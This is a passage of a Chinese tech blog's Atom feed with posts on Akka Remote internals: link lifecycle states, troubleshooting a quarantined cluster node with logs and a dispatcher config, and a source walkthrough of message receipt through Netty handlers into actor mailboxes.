    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2021-12-03T07:49:25.004Z</published>
    <updated>2021-12-03T08:42:23.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code> Remote模式下，网络链接的生命周期往往影响着对应Actor的生命周期，那么网络链接的生命周期是怎么样的呢，详细可参考下图。</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1637833127832-ef6f79a7-b3e0-43e8-863d-ac8c216590c1.png#clientId=u829361a7-232f-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=384&id=u351c9798&margin=%5Bobject%20Object%5D&name=image.png&originHeight=404&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77315&status=done&style=none&taskId=u16e8e192-7c61-4c46-93aa-8c1a9b497b7&title=&width=638.5" alt="image.png"></p><h2 id="2-状态介绍"><a href="#2-状态介绍" class="headerlink" title="2.状态介绍"></a>2.状态介绍</h2><pre><code>  每一个与远程系统的链路都是四个状态之一：**空闲、活跃、被守护、被隔离。**</code></pre><ul><li><strong>空闲（Idle）</strong></li></ul><p>远程系统的某个地址没有任何通信之前其关联状态就是Idle（空闲）。</p><ul><li><strong>活跃（Active）</strong></li></ul><p>当第一条消息试图发送给远程系统或入站链接被接受，链路的状态就被转化为Active（活跃），<br>这也意味着两个系统有消息的接收或者发送，而且目前为止也没有发生任何失败。</p><ul><li><strong>被守护（Gated）</strong></li></ul><p>当一个通信失败，或者两个系统间的链接丢失，链路的状态就会变成Gated（被守护）。<br>在被守护状态，系统不会试图去链接远程系统主机，所有出站消息都会被丢弃。<br>链路处于Gated状态的时间是通过 akka.remote.retry-gate-closed-for 参数控制的，<br>当超过这个时间，链路状态会重新转化成Idle（空闲）。<br><strong>Gate 是单边的，这也就意味着这期间无论何时当远程系统的入站链接被接受，</strong><br><strong>都会被自动转化成Active（活跃）状态</strong>，通信被立即重用。</p><ul><li><strong>被隔离（Quarantined）</strong></li></ul><p>当通信失败，且无法恢复时，由于参与系统的状态不一致，远程系统就会变成Quarantined（被隔离）状态。<br>与Gate不同，被隔离是永久的，它会一直持续到其中一个系统被重启。<br>重启之后，通信可以被重新恢复，链路状态重新变成Active（活跃）。</p><h2 id="3-状态流转"><a href="#3-状态流转" class="headerlink" title="3.状态流转"></a>3.状态流转</h2><p>其实remote的链路状态也比较容易理解，当没有建立连接时，就处于空闲状态；<br>有入站链接请求或消息发送时，如果连接建立成功，则变成活跃状态；<br>活跃状态时，如果发生通信失败且不是致命错误，比如网络中断，就会转到被守护状态；<br>被守护状态下，在指定时间内，如果网络正常，且收到了成功的入站链接请求，则重新恢复到活跃状态，<br>若超过指定守护时间则转化到空闲状态；<br>在活跃状态下，如果发生灾难性、不可恢复的错误，<br>比如系统消息传递失败或收到MemberRemoved事件，则该链路被隔离，直到远程系统重启后，<br>收到成功的入站或出站链接，则重新转换到活跃状态。<br>被守护、被隔离都是应对网络故障的，但分别对应可恢复和不可恢复。<br>被守护期间还有一定的时间阈值，该阈值内还有机会编程活跃状态。</p><h2 id="4-实例"><a href="#4-实例" class="headerlink" title="4.实例"></a>4.实例</h2><h3 id="4-1-Akka-Cluster节点Quarantined问题"><a href="#4-1-Akka-Cluster节点Quarantined问题" class="headerlink" title="4.1 Akka Cluster节点Quarantined问题"></a>4.1 Akka Cluster节点Quarantined问题</h3><pre><code>之前开发了一套基于akka cluster的调度|负载均衡系统，运行了半年均较稳定，但最近有节点两次down掉。由于没有太多经验，第一次down掉时经验主义地以为是内存吃紧导致程序异常（由于计算资源紧张，很多服务混布，内存确实非常紧张，时常有类似故障），第二次仔细检查了日志发现如下日志：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARN] [<span class="number">03</span>/<span class="number">17</span>/<span class="number">2018</span> <span class="number">21</span>:<span class="number">51</span>:<span class="number">38.769</span>] [cluster-akka.remote.<span class="keyword">default</span>-remote-dispatcher-<span class="number">91</span>] [akka.remote.Remoting] Tried to associate with unreachable remote address [akka.tcp:<span class="comment">//cluster@10.104.3.35:7712]. Address is now gated for 5000 ms, all messages to this address will be delivered to dead letters. Reason: [The remote system has quarantined this system. No further associations to the remote system are possible until this system is restarted.]</span></span><br></pre></td></tr></table></figure><pre><code> 同时在其它正常的节点上有如下日志</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[INFO] [<span class="number">03</span>/<span class="number">13</span>/<span class="number">2018</span> <span class="number">21</span>:<span class="number">36</span>:<span class="number">12.659</span>] [cluster-akka.remote.<span class="keyword">default</span>-remote-dispatcher-<span class="number">35339</span>] [akka.remote.Remoting] Quarantined address [akka.tcp:<span class="comment">//cluster@10.104.3.36:7712] is still unreachable or has not been restarted. Keeping it quarantined.</span></span><br></pre></td></tr></table></figure><pre><code>同时master上还有记录</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ERROR] [<span class="number">03</span>/<span class="number">17</span>/<span class="number">2018</span> <span class="number">21</span>:<span class="number">51</span>:<span class="number">37.662</span>] [cluster-akka.remote.<span class="keyword">default</span>-remote-dispatcher-<span class="number">127527</span>] [akka.remote.Remoting] Association to [akka.tcp:<span class="comment">//cluster@10.104.3.36:7712] with UID [1258718596] irrecoverably failed. Quarantining address.</span></span><br><span class="line">java.util.concurrent.TimeoutException: Remote system has been silent <span class="keyword">for</span> too <span class="keyword">long</span>. (more than <span class="number">48.0</span> hours)</span><br><span class="line">        at akka.remote.ReliableDeliverySupervisor$$anonfun$idle$<span class="number">1.</span>applyOrElse(Endpoint.scala:<span class="number">383</span>)</span><br><span class="line">        at akka.actor.Actor.aroundReceive(Actor.scala:<span class="number">517</span>)</span><br><span class="line">        at akka.actor.Actor.aroundReceive$(Actor.scala:<span class="number">515</span>)</span><br><span class="line">        at akka.remote.ReliableDeliverySupervisor.aroundReceive(Endpoint.scala:<span class="number">203</span>)</span><br><span class="line">        at akka.actor.ActorCell.receiveMessage(ActorCell.scala:<span class="number">527</span>)</span><br><span class="line">        at akka.actor.ActorCell.invoke(ActorCell.scala:<span class="number">496</span>)</span><br><span class="line">        at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:<span class="number">257</span>)</span><br><span class="line">        at akka.dispatch.Mailbox.run(Mailbox.scala:<span class="number">224</span>)</span><br><span class="line">        at akka.dispatch.Mailbox.exec(Mailbox.scala:<span class="number">234</span>)</span><br><span class="line">        at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:<span class="number">260</span>)</span><br><span class="line">        at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:<span class="number">1339</span>)</span><br><span class="line">        at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:<span class="number">1979</span>)</span><br><span class="line">        at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:<span class="number">107</span>)</span><br><span class="line">[<span class="number">03</span>/<span class="number">17</span>/<span class="number">2018</span> <span class="number">21</span>:<span class="number">51</span>:<span class="number">37.749</span>] [cluster-akka.actor.<span class="keyword">default</span>-dispatcher-<span class="number">105</span>] [akka.tcp:<span class="comment">//cluster@10.104.3.35:7712/system/cluster/core/daemon] Cluster Node [akka.tcp://cluster@10.104.3.35:7712] - Marking node as TERMINATED [akka.tcp://cluster@10.104.3.36:7712], due to quarantine. Node roles [dc-default]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-1-1-什么是quarantine"><a href="#4-1-1-什么是quarantine" class="headerlink" title="4.1.1 什么是quarantine"></a>4.1.1 什么是quarantine</h4><pre><code>  字面意思是隔离，(题外话：这个单词‘隔离’含义的起源是有典故的）， 那么大致猜测是GC或者网络抖动导致集群认为此节点不健康，被驱逐。于是检索了一下资料。</code></pre><p>akka cluster如果判定某节点会损害集群健康，就会把它隔离，可能的原因有如下三种：</p><ol><li>System message delivery failure 系统消息传递失败</li><li>Remote DeathWatch trigger 远程死亡监控触发</li><li>Cluster MemberRemoved event 集群移除节点<h4 id="4-1-2-解决办法"><a href="#4-1-2-解决办法" class="headerlink" title="4.1.2 解决办法"></a>4.1.2 解决办法</h4><pre><code>根据akka的文档，可以调整akka.cluster.failure-detector.threshold来设定判定阈值，来避免因为偶然拉动而导致的误判，但也不宜过大。另外，为了避免cluster系统与业务线程竞争，可为其设置单独的线程池. 在配置中增加</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">akka.cluster.use-dispatcher = cluster-dispatcher</span><br><span class="line">cluster-dispatcher &#123;</span><br><span class="line">  type = <span class="string">&quot;Dispatcher&quot;</span></span><br><span class="line">  executor = <span class="string">&quot;fork-join-executor&quot;</span></span><br><span class="line">  fork-join-executor &#123;</span><br><span class="line">    parallelism-min = <span class="number">2</span></span><br><span class="line">    parallelism-max = <span class="number">4</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>akka.cluster.use-dispatcher的默认配置为空。<br>最后，以上办法都无法保证节点永远不down，最好的方式还是做好容错。<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a>5.参考</h2> <a href="https://www.cnblogs.com/gabry/p/9394507.html">Akka源码分析-Remote-网络链接生命周期</a><br> <a href="https://doc.akka.io/docs/akka/current/remoting.html#lifecycle-and-failure-recovery-model">https://doc.akka.io/docs/akka/current/remoting.html#lifecycle-and-failure-recovery-model</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; Remote模式下，网络链接的生命周期往往影响着对应Actor的生命周期，那么网络链接的生命周期是怎么样的</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-心跳保活</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%BF%83%E8%B7%B3%E4%BF%9D%E6%B4%BB/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E5%BF%83%E8%B7%B3%E4%BF%9D%E6%B4%BB/</id>
    <published>2021-12-03T07:49:17.535Z</published>
    <updated>2021-12-03T09:07:15.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ProtocolStateActor"><a href="#1-ProtocolStateActor" class="headerlink" title="1.ProtocolStateActor"></a>1.ProtocolStateActor</h2><p>ProtocolStateActor通过状态机维持akka链路状态，</p><h3 id="1-1-状态维持"><a href="#1-1-状态维持" class="headerlink" title="1.1 状态维持"></a>1.1 状态维持</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634639191285-79a34003-0b79-4ecf-8e04-5f848f63f61f.png#clientId=u6855f1a2-4e4f-4&from=paste&height=156&id=u0f73ae17&margin=%5Bobject%20Object%5D&name=image.png&originHeight=312&originWidth=1190&originalType=binary&ratio=1&size=289278&status=done&style=none&taskId=u16ef156f-1aba-4a09-a964-428d101f753&width=595" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640833009-89727cf1-2a1a-4d5c-89f1-63d50b34be0a.png#clientId=uf0f2e3b1-5d66-4&from=paste&id=u8edecfe1&margin=%5Bobject%20Object%5D&name=image.png&originalType=binary&ratio=1&size=421345&status=done&style=none&taskId=u1bfaa84f-944a-42a5-913f-aaf6de4b335" alt="image.png"></p><ul><li><p>systemEnqueue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Mailbox.debug) println(receiver + <span class="string">&quot; having enqueued &quot;</span> + message)</span><br><span class="line">    val currentList = <span class="function">systemQueueGet</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(currentList.head == NoMessage)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (actor ne <span class="keyword">null</span>) actor.dispatcher.mailboxes.deadLetterMailbox.systemEnqueue(receiver, message)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!systemQueuePut(currentList, message :: currentList)) &#123;</span><br><span class="line">        message.unlink()</span><br><span class="line">        systemEnqueue(receiver, message)</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>processMailbox</p></li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (next ne <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (Mailbox.debug) println(actor.self + <span class="string">&quot; processing message &quot;</span> + next)</span><br><span class="line">      <span class="function">actor invoke next</span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">(Thread.interrupted()</span>)</span></span><br><span class="line"><span class="function">    throw new <span class="title">InterruptedException</span><span class="params">(<span class="string">&quot;Interrupted while processing actor messages&quot;</span>)</span></span></span><br><span class="line"><span class="function">     <span class="title">processAllSystemMessages</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  <span class="title">if</span> <span class="params">((left &gt; <span class="number">1</span>)</span> &amp;&amp; <span class="params">((dispatcher.isThroughputDeadlineTimeDefined == <span class="keyword">false</span>)</span> || <span class="params">(System.nanoTime - deadlineNs)</span> &lt; 0))</span></span><br><span class="line"><span class="function">     <span class="title">processMailbox</span><span class="params">(left - <span class="number">1</span>, deadlineNs)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ProtocolStateActor&quot;&gt;&lt;a href=&quot;#1-ProtocolStateActor&quot; class=&quot;headerlink&quot; title=&quot;1.ProtocolStateActor&quot;&gt;&lt;/a&gt;1.ProtocolStateActor&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Remote-收消息</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E6%94%B6%E6%B6%88%E6%81%AF/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E6%94%B6%E6%B6%88%E6%81%AF/</id>
    <published>2021-12-03T07:49:10.532Z</published>
    <updated>2021-12-03T09:07:15.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>在上文中，我们分析了网络链接建立的过程，一旦建立就可以正常的收发消息了。</p><ul><li>发送消息的细节不再分析，因为对于本地的actor来说这个过程相对简单，它只是创立链接然后给指定的netty网路服务发送消息就好了。</li><li>接收消息就比较麻烦了，因为这对于actor来说是透明的，netty收到消息后如何把消息分发给指定的actor呢？这个分发的过程值得研究研究。<h2 id="2-Actor触发"><a href="#2-Actor触发" class="headerlink" title="2.Actor触发"></a>2.Actor触发</h2>Akka的收消息是从mailbox里面消费消息,消费成功后触发业务Actor的onReceive，详细调用链如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632968210922-098d3766-4937-45ca-aa4e-695901e8be11.png#clientId=u36dc08b3-c1fa-4&from=paste&height=390&id=u3bfadf91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=442&originWidth=809&originalType=binary&ratio=1&size=67385&status=done&style=none&taskId=uf5ce47b1-cb0f-44bd-ac69-efa776b5a0f&width=713.5" alt="image.png"><br>调用堆栈如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">onReceive:<span class="number">19</span>, ClientActor (com.rcloud.akka.server.cmp)</span><br><span class="line">applyOrElse:<span class="number">167</span>, UntypedActor$$anonfun$receive$<span class="number">1</span> (akka.actor)</span><br><span class="line">aroundReceive:<span class="number">465</span>, Actor$<span class="class"><span class="keyword">class</span> (<span class="title">akka</span>.<span class="title">actor</span>)</span></span><br><span class="line"><span class="class"><span class="title">aroundReceive</span>:97, <span class="title">UntypedActor</span> (<span class="title">akka</span>.<span class="title">actor</span>)</span></span><br><span class="line"><span class="class"><span class="title">receiveMessage</span>:516, <span class="title">ActorCell</span> (<span class="title">akka</span>.<span class="title">actor</span>)</span></span><br><span class="line"><span class="class"><span class="title">invoke</span>:487, <span class="title">ActorCell</span> (<span class="title">akka</span>.<span class="title">actor</span>)</span></span><br><span class="line"><span class="class"><span class="title">processMailbox</span>:238, <span class="title">Mailbox</span> (<span class="title">akka</span>.<span class="title">dispatch</span>)</span></span><br><span class="line"><span class="class"><span class="title">run</span>:220, <span class="title">Mailbox</span> (<span class="title">akka</span>.<span class="title">dispatch</span>)</span></span><br><span class="line"><span class="class"><span class="title">exec</span>:393, <span class="title">ForkJoinExecutorConfigurator</span>$<span class="title">AkkaForkJoinTask</span> (<span class="title">akka</span>.<span class="title">dispatch</span>)</span></span><br><span class="line"><span class="class"><span class="title">doExec</span>:260, <span class="title">ForkJoinTask</span> (<span class="title">scala</span>.<span class="title">concurrent</span>.<span class="title">forkjoin</span>)</span></span><br><span class="line"><span class="class"><span class="title">runTask</span>:1339, <span class="title">ForkJoinPool</span>$<span class="title">WorkQueue</span> (<span class="title">scala</span>.<span class="title">concurrent</span>.<span class="title">forkjoin</span>)</span></span><br><span class="line"><span class="class"><span class="title">runWorker</span>:1979, <span class="title">ForkJoinPool</span> (<span class="title">scala</span>.<span class="title">concurrent</span>.<span class="title">forkjoin</span>)</span></span><br><span class="line"><span class="class"><span class="title">run</span>:107, <span class="title">ForkJoinWorkerThread</span> (<span class="title">scala</span>.<span class="title">concurrent</span>.<span class="title">forkjoin</span>)</span></span><br></pre></td></tr></table></figure>相关值如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632967070768-848bae89-41a5-4f22-8d49-d10dd5192725.png#clientId=u36dc08b3-c1fa-4&from=paste&height=380&id=uff013532&margin=%5Bobject%20Object%5D&name=image.png&originHeight=760&originWidth=1630&originalType=binary&ratio=1&size=691247&status=done&style=none&taskId=u2651f574-c875-45f2-9368-cc0964303a4&width=815" alt="image.png"><br>那消息是如何推送到mailbox呢，详细见下文分析<h2 id="3-网络层触发"><a href="#3-网络层触发" class="headerlink" title="3.网络层触发"></a>3.网络层触发</h2><h3 id="3-1-网络管理"><a href="#3-1-网络管理" class="headerlink" title="3.1 网络管理"></a>3.1 网络管理</h3>之前分析过，在监听创立的过程中，有一个对象非常关键：TcpServerHandler。它负责链接建立、消息收发等功能。TcpServerHandler继承了ServerHandler<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>[netty] <span class="function"><span class="keyword">abstract</span> class <span class="title">ServerHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">protected</span> <span class="keyword">final</span> val transport:               NettyTransport,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">private</span> <span class="keyword">final</span> val associationListenerFuture: Future[AssociationEventListener])</span></span></span><br><span class="line"><span class="function">  extends NettyServerHelpers with CommonHandlers</span></span><br></pre></td></tr></table></figure>ServerHandler继承了NettyServerHelpers<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>[netty] trait NettyServerHelpers extends SimpleChannelUpstreamHandler with NettyHelpers &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">messageReceived</span><span class="params">(ctx: ChannelHandlerContext, e: MessageEvent)</span>: Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">super</span>.messageReceived(ctx, e)</span><br><span class="line">    onMessage(ctx, e)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">exceptionCaught</span><span class="params">(ctx: ChannelHandlerContext, e: ExceptionEvent)</span>: Unit </span>= transformException(ctx, e)</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">channelConnected</span><span class="params">(ctx: ChannelHandlerContext, e: ChannelStateEvent)</span>: Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">super</span>.channelConnected(ctx, e)</span><br><span class="line">    onConnect(ctx, e)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">channelOpen</span><span class="params">(ctx: ChannelHandlerContext, e: ChannelStateEvent)</span>: Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">super</span>.channelOpen(ctx, e)</span><br><span class="line">    onOpen(ctx, e)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">channelDisconnected</span><span class="params">(ctx: ChannelHandlerContext, e: ChannelStateEvent)</span>: Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">super</span>.channelDisconnected(ctx, e)</span><br><span class="line">    onDisconnect(ctx, e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>很明显NettyServerHelpers有一个messageReceived应该就是收到消息时回调的方法，那onMessage在哪里实现呢？TcpServerHandler还继承了TcpHandlers，我们来看看TcpHandlers的onMessage方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">onMessage</span><span class="params">(ctx: ChannelHandlerContext, e: MessageEvent)</span>: Unit </span>= &#123;</span><br><span class="line">   val bytes: Array[Byte] = e.getMessage.asInstanceOf[ChannelBuffer].array()</span><br><span class="line">   <span class="keyword">if</span> (bytes.length &gt; <span class="number">0</span>) notifyListener(e.getChannel, InboundPayload(ByteString(bytes)))</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>它最终用InboundPayload封装了收到的数据，并调用了ChannelLocalActor.notifyListener方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>[remote] object ChannelLocalActor extends ChannelLocal[Option[HandleEventListener]] &#123;</span><br><span class="line">  <span class="function">override def <span class="title">initialValue</span><span class="params">(channel: Channel)</span>: Option[HandleEventListener] </span>= <span class="function">None</span></span><br><span class="line"><span class="function">  def <span class="title">notifyListener</span><span class="params">(channel: Channel, msg: HandleEvent)</span>: Unit </span>= get(channel) foreach &#123; _ notify msg &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ChannelLocalActor可以先把它理解成一个ThreadLocal对象，其他的技术细节读者可以自行谷歌。notifyListener只调用了get，那具体是在哪里set的呢？通过channel变量get到的Option[HandleEventListener]又是在哪里赋值的呢？<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">registerListener</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  channel:             Channel,</span></span></span><br><span class="line"><span class="params"><span class="function">  listener:            HandleEventListener,</span></span></span><br><span class="line"><span class="params"><span class="function">  msg:                 ChannelBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  remoteSocketAddress: InetSocketAddress)</span>: Unit </span>= ChannelLocalActor.set(channel, Some(listener))</span><br></pre></td></tr></table></figure>很显然是在registerListener时set的值，那registerListener在哪里调用呢？如果读过上一篇的文章，一定会知道ServerHandler.initInbound函数，这个函数调用了CommonHandlers.init<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">protected</span> def <span class="title">init</span><span class="params">(channel: Channel, remoteSocketAddress: SocketAddress, remoteAddress: Address, msg: ChannelBuffer)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    op: (AssociationHandle ⇒ Any)</span>): Unit </span>= &#123;</span><br><span class="line">    <span class="keyword">import</span> transport._</span><br><span class="line">    NettyTransport.addressFromSocketAddress(channel.getLocalAddress, schemeIdentifier, system.name, Some(settings.Hostname), None) match &#123;</span><br><span class="line">      <span class="function"><span class="keyword">case</span> <span class="title">Some</span><span class="params">(localAddress)</span> ⇒</span></span><br><span class="line"><span class="function">        val handle </span>= createHandle(channel, localAddress, remoteAddress)</span><br><span class="line">        handle.readHandlerPromise.future.foreach &#123;</span><br><span class="line">          listener ⇒</span><br><span class="line">            registerListener(channel, listener, msg, remoteSocketAddress.asInstanceOf[InetSocketAddress])</span><br><span class="line">            channel.setReadable(<span class="keyword">true</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        op(handle)</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">case</span> _ ⇒ NettyTransport.gracefulClose(channel)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><p>上面的函数中调用了registerListener，那listener具体在哪里创建的呢，或者是哪个变量对应的值呢？这就需要研究createHandle对象及其返回值是什么了。经过分析还是找到了TcpHandlers这个trait，里面有createHandle的具体实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">override def <span class="title">createHandle</span><span class="params">(channel: Channel, localAddress: Address, remoteAddress: Address)</span>: AssociationHandle </span>=</span><br><span class="line">  <span class="keyword">new</span> TcpAssociationHandle(localAddress, remoteAddress, transport, channel)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TcpAssociationHandle源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>[remote] <span class="class"><span class="keyword">class</span> <span class="title">TcpAssociationHandle</span>(</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">localAddress</span>:    <span class="title">Address</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">remoteAddress</span>:   <span class="title">Address</span>,</span></span><br><span class="line"><span class="class">  <span class="title">val</span> <span class="title">transport</span>:       <span class="title">NettyTransport</span>,</span></span><br><span class="line"><span class="class">  <span class="title">private</span> <span class="title">val</span> <span class="title">channel</span>: <span class="title">Channel</span>)</span></span><br><span class="line"><span class="class">  <span 